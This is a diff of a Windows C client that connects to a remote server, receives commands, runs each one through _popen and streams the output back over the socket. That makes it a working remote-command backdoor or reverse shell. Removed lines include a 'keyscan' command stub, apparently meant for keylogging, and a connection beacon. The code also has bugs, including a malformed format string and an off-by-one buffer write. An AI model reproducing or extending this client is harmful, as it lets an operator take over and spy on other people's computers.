@@ -3,13 +3,12 @@
 // winsock2.h is the header file to be included for winsock functions
 #include <WinSock2.h>
 #include <WS2tcpip.h>
+#include <stdlib.h>
 
 #define DEFAULT_BUFLEN 128
 
 // ws2_32.lib is the library file to be linked with the program to be able to use winsock functions.
 #pragma comment(lib, "ws2_32.lib")
-
-void post(SOCKET s, char string);
 
 int main(int argc, char* argv[]) {
 
@@ -22,31 +21,31 @@ int main(int argc, char* argv[]) {
 
 	struct sockaddr_in server;
 	// set reply to 128 bytes since we shouldn't ever receive a command longer than that
-	char *server_reply[DEFAULT_BUFLEN];
+	char server_reply[DEFAULT_BUFLEN];
 	int recv_size = DEFAULT_BUFLEN;
 
 	int iResult;
 
-	printf_s("\nInitialising Winsock...");
+	printf("\nInitialising Winsock...");
 
 	// init WinSock2
 	iResult = WSAStartup(MAKEWORD(2, 2), &wsa);
 	if (iResult != NO_ERROR) {
-		wprintf_s(L"WSAStartup function failed with error: %d\n", iResult);
+		wprintf(L"WSAStartup function failed with error: %d\n", iResult);
 		return 1;
 	}
 
-	printf_s("\nInitialised.");
+	printf("\nInitialised.");
 
 	// socket(address_family, socket_type, protocol)
 	// If a value of 0 is specified, the caller does not wish to specify a protocol 
 	// and the service provider will choose the protocol to use.
 	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
-		printf_s("Could not create socket: &d", WSAGetLastError());
+		printf("Could not create socket: &d", WSAGetLastError());
 		WSACleanup();
 	}
 
-	printf_s("\nSocket created.\n");
+	printf("\nSocket created.\n");
 
 	// the server ip we want to connect to 
 	// The ip string can be converted to the in_addr structure with the InetPton function
@@ -66,53 +65,32 @@ int main(int argc, char* argv[]) {
 
 	puts("Connected");
 
-	// send init message
-	char *message = "**Client connected**";
-	if (send(s, message, strlen(message), 0) < 0)
-	{
-		puts("Send failed");
-		return -1;
-	}
-
-	puts("Data sent.\n");
-
 	do {
 		if ((recv_size = recv(s, server_reply, DEFAULT_BUFLEN, 0)) == SOCKET_ERROR)
 		{
 			puts("recv failed");
 		}
-	
+
 		puts("Reply received\n");
 
 		//Add a NULL terminating character to make it a proper string before printing
 		server_reply[recv_size] = '\0';
 		puts(server_reply);
 
-		char  psBuffer[512];
+		char   psBuffer[128];
 		FILE* pPipe;
-		char *cmdFailMsg = "Command failed!";
 
-		/* SPECIAL COMMANDS CHECK */
-		char BLANK_CMD = "no command supplied.";
-		char KEYSCAN = "spinning up keyscan.";
+		/* Run DIR so that it writes its output to a pipe. Open this
+		 * pipe with read text attribute so that we can read it
+		 * like a text file.
+		 */
 
-		if (server_reply == "") {
-			post(s, BLANK_CMD);
-			return 0;
-		}
-		if (server_reply == "keyscan") {
-			post(s, KEYSCAN);
-			return 0;
-		}
-
-		// run our remote command on our clients shell
-		if ((pPipe = _popen(server_reply, "r")) == NULL) {
-			printf_s("Error running command!");
-			/*send(s, cmdFailMsg, strlen(cmdFailMsg), 0);*/
-		}
+		if ((pPipe = _popen(server_reply, "rt")) == NULL)
+			exit(1);
 
 		/* Read pipe until end of file, or an error occurs. */
-		while (fgets(psBuffer, 512, pPipe))
+
+		while (fgets(psBuffer, 128, pPipe))
 		{
 			send(s, psBuffer, strlen(psBuffer), 0);
 		}
@@ -124,7 +102,7 @@ int main(int argc, char* argv[]) {
 		}
 		else
 		{
-			printf_s("Error: Failed to read the pipe to the end.\n");
+			printf("Error: Failed to read the pipe to the end.\n");
 		}
 
 	} while (i == 1);
@@ -132,6 +110,10 @@ int main(int argc, char* argv[]) {
 	return 0;
 }
 
-void post(SOCKET s, char string) {
-	send(s, string, strlen(string), 0);
+int sendData(SOCKET s, char* msg) {
+	if (send(s, msg, strlen(msg), 0) < 0) {
+		puts("Send failed");
+		return 0;
+	}
+	return 1;
 }
